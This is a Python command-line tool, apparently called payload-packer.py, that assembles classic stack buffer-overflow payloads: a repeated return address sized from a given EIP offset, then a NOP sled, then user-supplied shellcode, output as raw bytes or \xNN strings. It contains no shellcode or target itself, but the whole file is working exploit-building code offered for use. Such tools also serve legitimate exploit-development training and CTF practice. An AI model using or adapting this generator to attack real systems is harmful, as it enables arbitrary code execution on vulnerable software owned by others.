#!/bin/env python3
# This program is designed to generate simple buffer overflows, it will accept as input shellcode, a buffer offset from saved EIP on stack, and length of a NOP SLED. The output will be a binary payload to send to an input.

# The Layout of the payload is as follows:
#
#
# ####################### (Lower Address)
# #       Ret Spam      #
# #######################
# #      NOP SLED       #
# #######################
# #     Shell Code      #
# ####################### (Higher Address)

# The buffer Offset provided - how far from buffers location to the start of EIP tells us how long Ret Spam should be. It should be long enough to fill the distance and then a single more time. Increasing this slightly can add a saftey margin. Covering to much can limit room for shell code and nop sled. Ret Spam is the address we plan to jump to. Because we can create core files or view dmesg logs, ESP is a safe bet. Perhaps this could be tunable.

# Shell Code is the executable assembly. PIE.

# NOP sled is our saftey margin.

import argparse
import binascii
import sys
import struct
from typing import NoReturn,Dict,Callable,Union,List
import os

def bytes_to_ascii(b:bytes) -> str:
    '''Formats \\xNN style'''
    return '\\x' + binascii.b2a_hex(b,'\\').decode().replace('\\','\\x');

def ascii_to_bytes(s:str) -> bytes:
    s = s.translate({ord('\\'):None, ord('x'): None, ord('X'):None, ord(' '):None, ord('"'):None, ord('\n'):None, ord('\t'):None}) #strip \x
    return bytes.fromhex(s);

def build_payload(shellcode:bytes , ret_addr:int , ip_offset:int ,nop_len:int, **kwargs) -> bytes:
    ''' This function is the magic. Here We build a payload'''
    pointer_len: Dict[str,int] = { 'linux/x86': 4, 'linux/x86_64': 8 , 'native': struct.calcsize("@P") }
    #Then number of times we do the ret spam should be ip_offset // sizeof(void*) + 1
    ret_addr_bytes = ret_addr.to_bytes(pointer_len[kwargs['arch']],byteorder=sys.byteorder,signed=False)
    ret_spam_times = ip_offset // len(ret_addr_bytes) + 1 #we may have to handle padding!
    ret_spam = ret_addr_bytes * ret_spam_times;

    nop_sled = b"\x90" * nop_len;
    
    return ret_spam + nop_sled + shellcode

def parse_args(argv:List) -> argparse.Namespace:
    ''' This Function parses the arguments for the payload-packer.py from an array '''
    parser:argparse.Parser = argparse.ArgumentParser(description='Generate An Exploit Payload')
    parser.add_argument('--shellcode-file','-f',nargs='?',type=str, default='-', dest='shellcode_file',metavar='file',help='file containing binaryshellcode, - for STDIN');
    parser.add_argument('--ip-offset',type=str, metavar='offset',dest='ip_offset',help='distance from start of buffer to instruction pointer',required=True);
    parser.add_argument('--nop-len', '-n', type=str, default='60', metavar='len', dest='nop_len',help='size of the nop sled in bytes');
    parser.add_argument('--jmp-addr','-j',type=str, metavar='jmp-addr',dest='jmp_addr',help='address to jump to, probably should be esp at crash',required=True);
    parser.add_argument('--output-file','-o',default='-',type=str, metavar='out',dest='outfile',help='File to Write, By default STDOUT',required=False);
    parser.add_argument('--ascii-in','-a',default=False, action='store_true', dest='ascii_in', help='Read Input as \\xNN formated strings');
    parser.add_argument('--ascii-out', default=False, action='store_true', dest='ascii_out',help='Write Output as \\xNN formated strings');
    parser.add_argument('--arch', default='native', metavar='arch', choices=['linux/x86_64','linux/x86', 'native'], dest='arch', help='Architecture to build payload for');
    # Possible Future arguments: --shellcode-string (accept a x90x90 string)
    # Possible Future arguments: --esp_jmp_offset   (adjust retspam address to be a distance from EIP
    opts:argparse.Namespace = parser.parse_args(argv[1:]);

    #BUILD RET ADDR
    #We Should probably except ESP in return fn,previous frame, formatted as Hexidecimal 0x string. 
    try:
        opts.jmp_addr = int(opts.jmp_addr, base=0);
    except Exception as err:
        print("{0} doesn't appear to be a valid hexidecmal return address:\n\t\t\t\t\t{1}".format(opts.jmp_addr,err))
        sys.exit(3)

    #Get IP OFFSET - This tell use how many times RET_SPAM must be repeated.
    try:
        opts.ip_offset = int(opts.ip_offset, base=0);
    except Exception as err:
        print("IP OFFSET {0} doesn't appear to be a valid hexidecimal or decimal number.\n\t\t\t\t\t{1}".format(opts.ip_offset,err))
        sys.exit(4)
    #Get NOP LEN:
    try:
        opts.nop_len:int = int(opts.nop_len, base=0);
    except Exception as err:
        print("{0} is invalid nop length!:\n\t\t\t\t\t{1}".format(opts.nop_len,err))
        sys.exit(5);
    return opts

def open_wrap_stdinout(path,flags):
    '''This function wraps os.open so that '-' refers to stdin/stdout, this fn may raise OSError'''
    if(path != '-'):
        return os.open(path,flags);
    elif(0x00001 & flags == os.O_RDONLY):
        return os.dup(sys.stdin.fileno());
    elif(os.O_WRONLY & flags == os.O_WRONLY or os.O_RDWR & flags == os.O_RDWR):
        return os.dup(sys.stdout.fileno());
    else:
        raise OSError


def read_shellcode(path:str ='-',fmt='binary') -> bytes:
    '''This function reads shellcode from path, defaulting to standard input'''
    input_encodings = {'binary': lambda identity: identity, 'ascii': lambda a: ascii_to_bytes(a.decode())}
    try: 
        infp = open(path,mode='rb',opener=open_wrap_stdinout)
        shellcode:bytes = input_encodings[fmt](infp.read());
        infp.close();
        return shellcode
    except Exception as err:
        print("Trouble Opening ShellCode File {0}:\n\t\t\t\t\t{1}".format(path,err),file=sys.stderr)
        sys.exit(1);

def write_payload(payload:bytes, path:str = '-', fmt='binary') -> None:
    output_encodings = { 'binary': lambda a : a , 'ascii': lambda a : bytes_to_ascii(a).encode()}
    try:
        outfp = open(path, mode='wb', opener=open_wrap_stdinout);
        outfp.write(output_encodings[fmt](payload))
        outfp.flush();
        outfp.close();
    except Exception as err:
        print("Unable to write payload to file {0}:\n\t\t\t\t\t{1}".format(path,err))
        sys.exit(6);

def main() -> NoReturn: 
    '''Main Function. This causes a payload to be created from shellcode'''
    opts = parse_args(sys.argv); # Parse Arguments
    shellcode:bytes = read_shellcode(opts.shellcode_file, fmt= 'ascii' if opts.ascii_in else 'binary')
    payload:bytes = build_payload(shellcode,opts.jmp_addr,opts.ip_offset,opts.nop_len,arch=opts.arch)
    write_payload(payload, opts.outfile, fmt='ascii' if opts.ascii_out else 'binary');
    sys.exit(0)

if __name__ == '__main__':
    main();

